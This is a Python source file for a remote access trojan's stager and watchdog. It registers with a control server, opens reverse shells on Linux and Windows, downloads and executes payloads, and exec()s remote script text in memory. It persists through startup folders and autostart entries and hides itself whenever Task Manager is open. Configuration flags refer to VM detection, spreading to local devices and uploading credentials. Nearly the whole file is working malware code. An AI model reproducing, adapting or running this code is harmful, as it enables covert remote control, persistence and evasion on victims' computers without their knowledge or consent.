import subprocess
import psutil
import time
import os
import platform
import requests
import shutil
import getpass
import threading

### TO DO
# CREATE STAGE 0 STUB, THAT EXEC WATCHDOG SCRIPT FROM MEMORY #
# ENCRYPT EXEC SCRIPTS AND DECRYPT AT RUNTIME #

OS = platform.uname()[0]

### NAME OF PAYLOAD AND WATCHDOG FILES YOU CAN NAME ANYTHING YOU WANT, DO NOT INCLUDE EXTENTIONS EX. .EXE OR .BIN
_PAYLOAD_NAME = "payload"
_WATCHDOG_NAME = "watchdog"

### IF AUTO START == 1, WATCHDOG WILL CHECK THAT IT IS RUNNING IN AUTOSTART MODE
_AUTOSTART_WATCHDOG = 1
_AUTOSTART_WATCHDOG_DESKTOP_SHORTCUTS = 0

### FULL ADDRESS TO THE WEBSERVER
_WEB_SERVER = "192.168.1.6:3000"

### REMOVE FROM STARTUP UNRIL TASKMANAGER IS CLOSED WINDOWS ONLY ####
_WIN_TASK_MANANGER_REMOVE_STARTUP = 0

### DETECT VIRTUAL MACHINE ###
_REMOVE_IF_IN_VM = 1

### WEB SERVER ADDRESS
_WEB_SERVER = "192.168.1.6:3000"

### PAYLOAD STAGING OPTIONS ###
# 1 = EVAL SCRIPT FROM URL IN MEMORY#
# 2 = DOWNLOAD BINARY TO DISK AND EXECUTE #
_STAGING_OPT = 1

root = 0

if _STAGING_OPT == 1:
    import random
    import shlex
    import pyautogui
    import datetime
    import PIL
    # PAYLOAD OPTIONS #

    ### ENABLE REMOTE SHELL ###
    _RSHELL_OPT = 1
    ### ATTEMPT TO SPREAD TO A LOCAL PC OR DEVICE ###
    _SPREAD_OPT = 0
    _FAST_ROOT_OPT = 0
    _AUTO_UPLOAD_CREDS_OPT = 0

    _REG_URL = 'http://{0}/register'.format(_WEB_SERVER)
    _CHECK_IF_REGISTERED = 'http://{0}/check_if_registered'.format(_WEB_SERVER)
    _CHECK_FOR_COMMAND = 'http://{0}/command'.format(_WEB_SERVER)
    _OS = platform.uname()[0]
    username = getpass.getuser()
    def get_ip():
        
        try:
                proc = requests.get('http://{0}/getip'.format(_WEB_SERVER))
                return proc.content.decode('utf8')

        except Exception as e:
            
            pass
            
    _MY_IP = get_ip()
    while _MY_IP == None:
        _MY_IP = get_ip()

    def get__RSHELL_OPT_ip():
        _MY_IP = get_ip()
        while _MY_IP == None:
            _MY_IP = get_ip()
        try:
            proc = requests.get('http://{0}/rshell/{1}/{2}'.format(_WEB_SERVER, _MY_IP, username))
            return proc.content.decode('utf8')
        except Exception as e:
            pass

    def _RSHELL_OPT_():
        try:
            if platform.uname()[0] == "Linux":
                    exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(get__RSHELL_OPT_ip()))
            elif platform.uname()[0] == "Windows":
                import os,socket,subprocess,threading;
                def s2p(s, p):
                    while True:
                        data = s.recv(1024)
                        if len(data) > 0:
                            p.stdin.write(data)
                            p.stdin.flush()

                def p2s(s, p):
                    while True:
                        s.send(p.stdout.read(1))

                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(("{0}".format(get__RSHELL_OPT_ip()), 1337))
                p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
                s2p_thread = threading.Thread(target=s2p, args=[s, p])
                s2p_thread.daemon = True
                s2p_thread.start()
                p2s_thread = threading.Thread(target=p2s, args=[s, p])
                p2s_thread.daemon = True
                p2s_thread.start()
                try:
                    p.wait()
                except KeyboardInterrupt:
                    s.close()
                    timer = threading.Timer(60, _RSHELL_OPT_)
                    timer.start()
                    pass
        except Exception as e:
            print(e)
            timer = threading.Timer(60, _RSHELL_OPT_)
            timer.start()
            pass


### DOWNLOAD LINKS FOR PAYLOAD AND WATCH DOG
if OS == "Linux":
    _PAYLOAD_LINK = "http://{0}/downloads/linux/payload".format(_WEB_SERVER)
    _WATCHDOG_LINK = "http://{0}/downloads/linux/watchdog".format(_WEB_SERVER)
    
elif OS == "Windows":
    _PAYLOAD_LINK = "http://{0}/downloads/windows/payload".format(_WEB_SERVER)
    _WATCHDOG_LINK = "http://{0}/downloads/windows/watchdog".format(_WEB_SERVER)


def start_windows_payload():
    subprocess.call("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME))

### IF OPTION TO AUTOSTART WATCH DOG IS ENABLED, PROCCEED WITH THIS FUNCTION ###
if _AUTOSTART_WATCHDOG == 1:
    print("checking for startup file")
    if platform.uname()[0] == "Linux":
        if _WATCHDOG_NAME in os.listdir("/home/{0}/.config/".format(getpass.getuser())):
            print("watching dog is in startup")
            pass
        else:
            print("payload not found")
            try:
                print("file doesnt exists")
                requests.get(_WATCHDOG_LINK)
                r = requests.get(_WATCHDOG_LINK)
                file = open("./{0}".format(_WATCHDOG_NAME), 'wb')
                subprocess.Popen(["chmod", "+x", "{0}".format(_WATCHDOG_NAME)])
                file.write(r.content)
                file.close()
                shutil.move("./{0}", "/home/{1}/.config/".format(_WATCHDOG_NAME, getpass.getuser()))
                with open("{0}.desktop".format(_WATCHDOG_NAME), "w") as FILE:
                    _STARTUP_LINES = ["[Desktop Entry]", "Type=Application", "Version=1.0", "Name={0}".format(_WATCHDOG_NAME),
                     "Comment=none", "Exec=/home/{0}/.config/{1}".format(getpass.getuser(), _WATCHDOG_NAME), "StartupNotify=false",
                     "Terminal=false"]
                    for LINES in _STARTUP_LINES:
                        FILE.writelines(LINES + "\n")
                    FILE.close()
                shutil.move("./{0}.desktop".format(_WATCHDOG_NAME), "/home/{0}/.config/autostart".format(getpass.getuser()))
            except Exception as e:
                print(e)
                pass
            
    elif platform.uname()[0] == "Windows":
        print("windows pc")
        try:
            if "{0}.exe".format(_WATCHDOG_NAME) in os.listdir("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(getpass.getuser())):
                print("watching dog is in startup")
                pass
            else:
                    print("file doesnt exists")
                    requests.get(_WATCHDOG_LINK)
                    r = requests.get(_WATCHDOG_LINK)
                    file = open("./{0}.exe".format(_WATCHDOG_NAME), 'wb')
                    file.write(r.content)
                    file.close()
                    shutil.move("./{0}.exe".format(_WATCHDOG_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(getpass.getuser()))
        except Exception as e:
            print(e)
            pass

def exec_payload_thread():
    r = requests.get("http://{0}/remote".format(_WEB_SERVER))
    _PAYLOAD_SCRIPT = r.text
    exec(_PAYLOAD_SCRIPT)

if _STAGING_OPT == 1:
    threading.Thread(target=exec_payload_thread).start()
    
while 1:
    time.sleep(1)
    RUNNING = 0
    _WIN_TASK_MANAGER_RUNNING = 0
    for PROC in psutil.process_iter():
        if _STAGING_OPT == 2:
            if PROC.name() == "payload.exe":
                print("rat is running")
                RUNNING = 1
        if PROC.name() == "Taskmgr.exe":
            print("taskmanager is running")
            _WIN_TASK_MANAGER_RUNNING = 1
            
            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME)):
                pass
            else:
                shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft".format(getpass.getuser()))
            
### IF PAYLOAD NOT RUNNING CHECK IF EXISTS. IF NOT DOWNLOAD AND START
    if _STAGING_OPT == 2:
        if RUNNING == 0:
            if _WIN_TASK_MANAGER_RUNNING == 1:
                pass
            else:
                try:
                    if OS == "Linux":
                        if os.path.exists("/home/{0}/.config/{1}".format(getpass.getuser(), _PAYLOAD_NAME)):
                            subprocess.Popen(["chmod", "+x", "{0}".format(_PAYLOAD_NAME)])
                            subprocess.call("./home/{0}/.config/{0}".format(getpass.getuser(), _PAYLOAD_NAME))
                            print('spawned rat')
                        
                    elif OS == "Windows":
                        print("winwin")
                        if _WIN_TASK_MANAGER_RUNNING == 1:
                            pass
                        
                        else:
                            ### IF PAYLOAD NOT IN THE PATH DOWNLOAD FROM LINK ###
                            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME)):
                                threading.Thread(target=start_windows_payload).start()
                                time.sleep(5)
                                
                                print('spawned rat')
                            else:
                                requests.get(_PAYLOAD_LINK)
                                r = requests.get(_PAYLOAD_LINK)
                                file = open("./{0}.exe".format(_PAYLOAD_NAME), 'wb')
                                file.write(r.content)
                                file.close()
                                shutil.move("./{0}.exe".format(_PAYLOAD_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME))
                            
                except Exception as e:
                    print(e)
                    pass

                    

### CHECK IF TASK MANAGER IS RUNNING CROSSPLATFORM ###
    if _WIN_TASK_MANAGER_RUNNING == 1:
        print("task manager running")
        try:
                if OS == "Linux":
                    if os.path.exists("/home/{0}/.config/{1}".format(getpass.getuser(), _PAYLOAD_NAME)):
                        pass
                    
                elif OS == "Windows":
                    print("winwin")

### IF PAYLOAD IS RUNNING WHILE TASKMANAGER IS RUNNING, KILL IT ###
                    if _STAGING_OPT == 2:
                        for PROC in psutil.process_iter():
                            if PROC.name() == "payload.exe":
                                os.system("taskkill /f /im payload.exe")

### IF WATCHDOG IS IN STARTUP FOLDER WHILE TASKMANAGER IS OPEN, HIDE IT IN ANOTHER FOLDER ###                    
                    if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME)):
                        if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME)):
                            os.remove("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME))

                        shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft".format(getpass.getuser()))
                        
                        PROC_LIST = []
                        while _WIN_TASK_MANAGER_RUNNING == 1:
                            for PROC in psutil.process_iter():
                                if PROC.name() == "Taskmgr.exe":
                                    PROC_LIST.append("Taskmgr")
                                                              
                                if len(PROC_LIST) == 0:
                                    _WIN_TASK_MANAGER_RUNNING = 0
                                    
                            print(len(PROC_LIST))
                            PROC_LIST = []                            
                            
        except Exception as e:
            print(e)
            pass
#### WHEN TASK MANAGER IS NO LONGER OPENED MOVE WATCHDOG FILE BACK TO THE STARTUP FOLDER ###
    if _WIN_TASK_MANAGER_RUNNING == 0:
        print('no task manager')
        if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME)):
            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME)):
                os.remove("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME))
            shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _WATCHDOG_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\".format(getpass.getuser()))

            
